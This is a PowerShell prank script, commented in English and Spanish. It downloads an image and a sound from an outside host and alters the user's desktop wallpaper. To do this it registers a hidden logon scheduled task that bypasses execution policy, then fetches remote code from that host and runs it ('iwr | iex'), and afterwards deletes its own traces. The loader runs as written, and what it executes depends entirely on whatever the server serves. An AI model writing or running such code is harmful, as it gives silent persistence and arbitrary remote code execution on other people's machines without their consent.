# Directory and file names
# Nombres de archivos y carpetas
$folderPath = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'screenRot'
$audioFilename = 'sound.wav'
$overlayFilename = 'img.png'
$outputFilename = 'wallpaper.bmp'
$overlayPath = Join-Path $folderPath $overlayFilename
$outputPath = Join-Path $folderPath $outputFilename
$audioPath = Join-Path $folderPath $audioFilename

# Assets URLs
# Direcciones de los archivos
$urlScript = 'https://rot.intorandom.com/run'
$urlImage = 'https://rot.intorandom.com/img'
$urlAudio = 'https://rot.intorandom.com/sound'

# Windows task name
# Nombre de la tarea de Windows
$taskName = 'rotScreen'

# Function to check if assets exist in user's computer
# Función para verificar la existencia de los archivos en el computador del usuario
function CheckAssets {
    if (-not (Test-Path $overlayPath) -or (Get-Item $overlayPath).Length -eq 0) {
        return $false
    }
    if (-not (Test-Path $audioPath) -or (Get-Item $audioPath).Length -eq 0) {
        return $false
    }
    return $true
}

# Function to download assets in user's computer
# Función para descargar los archivos en la computadora del usuario
function DownloadAssets {
    try {
        if (-not (Test-Path $folderPath)) {
            New-Item -ItemType Directory -Path $folderPath | Out-Null
        }
        Invoke-WebRequest -Uri $urlImage -OutFile $overlayPath -ErrorAction Stop
        Invoke-WebRequest -Uri $urlAudio -OutFile $audioPath -ErrorAction Stop

        Write-Host 'Assets downloaded in: ' $folderPath
    }
    catch {
        Write-Error 'Error downloading assets: $_'
        exit
    }
}

# Function to create rot wallpaper
# Función para crear el fondo de pantalla con falla
function GenerateWallpaper {
    try {
        Add-Type -AssemblyName System.Drawing

        $currentWallpaper = Get-ItemPropertyValue 'HKCU:\Control Panel\Desktop' -Name WallPaper
        if (-not (Test-Path $currentWallpaper)) {
            Write-Error "Could not get current wallpaper."
            exit
        }

        $background = [System.Drawing.Image]::FromFile($currentWallpaper)
        $overlay = [System.Drawing.Image]::FromFile($overlayPath)

        $bgWidth = $background.Width
        $bgHeight = $background.Height

        $scale = [Math]::Min($bgWidth / $overlay.Width, $bgHeight / $overlay.Height)
        $newWidth = [int]($overlay.Width * $scale)
        $newHeight = [int]($overlay.Height * $scale)

        $resizedOverlay = New-Object System.Drawing.Bitmap $newWidth, $newHeight
        $gOverlay = [System.Drawing.Graphics]::FromImage($resizedOverlay)
        $gOverlay.DrawImage($overlay, 0, 0, $newWidth, $newHeight)
        $gOverlay.Dispose()
        $overlay.Dispose()

        $result = New-Object System.Drawing.Bitmap $bgWidth, $bgHeight
        $graphics = [System.Drawing.Graphics]::FromImage($result)
        $graphics.DrawImage($background, 0, 0, $bgWidth, $bgHeight)

        $background.Dispose()

        $x = $bgWidth - $newWidth
        $y = 0
        $graphics.DrawImage($resizedOverlay, $x, $y)
        $resizedOverlay.Dispose()
        $graphics.Dispose()

        $result.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
        $result.Dispose()

    }
    catch {
        Write-Error "Error creating rot wallpaper: $_"
        exit
    }
}

# Function to set rot wallpaper
# Función para aplicar el fondo de pantalla con falla
function SetWallpaper {
    $code = @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

    Add-Type $code

    $SPI_SETDESKWALLPAPER = 0x0014
    $SPIF_UPDATEINIFILE = 0x01
    $SPIF_SENDCHANGE = 0x02

    [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE) | Out-Null
}

# Function to play sound
# Función para reproducir el sonido
function PlaySound {
    $player = New-Object System.Media.SoundPlayer $audioPath
    $player.Play()
}

# Function to register new task, it will run in next logon
# Función para registrar la tarea, esta se activara en el proximo inicio de sesión
function RegisterTask {
    try {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false

        $accion = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"try { `$url='$urlScript'; iwr `$url -UseBasicParsing | iex } catch { Write-Error $_ }`"" -WorkingDirectory "$env:USERPROFILE"

        $desencadenador = New-ScheduledTaskTrigger -AtLogOn 
        $desencadenador.UserId = "$env:USERDOMAIN\$env:USERNAME"  

        $configuracion = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

        Register-ScheduledTask -TaskName $taskName -Action $accion -Trigger $desencadenador -Settings $configuracion -RunLevel Limited

        Write-Host 'Ready, this will run in next logon' 
        Write-Host 'Prease close this window' 
    }
    catch {
        Write-Error "Error task not registered: $_"
    }
}


# Script execution structure
# Estructura de ejecución del script
if (-not (CheckAssets)) {
    DownloadAssets
    RegisterTask
}
else {
    GenerateWallpaper

    Start-Sleep -Seconds 5
    PlaySound
    
    Start-Sleep -Seconds 3
    SetWallpaper
    
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    Remove-Item -Path $folderPath -Recurse -Force
}
